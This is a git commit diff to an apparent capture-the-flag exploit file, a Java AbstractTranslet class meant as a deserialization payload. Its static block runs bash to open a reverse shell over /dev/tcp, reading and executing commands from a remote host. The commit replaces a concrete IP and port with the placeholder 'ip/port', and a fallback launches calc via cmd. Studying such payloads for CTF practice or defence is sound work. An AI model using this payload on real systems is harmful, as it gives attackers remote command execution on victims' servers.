4dfff0148854b3eb9bee7943b48620c1a3d33c6c
Firebasky <63966847+Firebasky@users.noreply.github.com>
2022-07-10 09:34:16 +0800

    Update shell.java

--- 2021_lcb_ezjava/src/main/java/com/firebasky/lvbezjava/exp/shell.java
+++ 2021_lcb_ezjava/src/main/java/com/firebasky/lvbezjava/exp/shell.java
@@ -10,7 +10,7 @@ import java.io.IOException;
 public class shell extends AbstractTranslet {
     static {
         try{
-            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/1.116.136.120/2333;cat <&5 | while read line; do $line 2>&5 >&5; done"});
+            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done"});
         }catch (IOException e){
             try{
                 Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
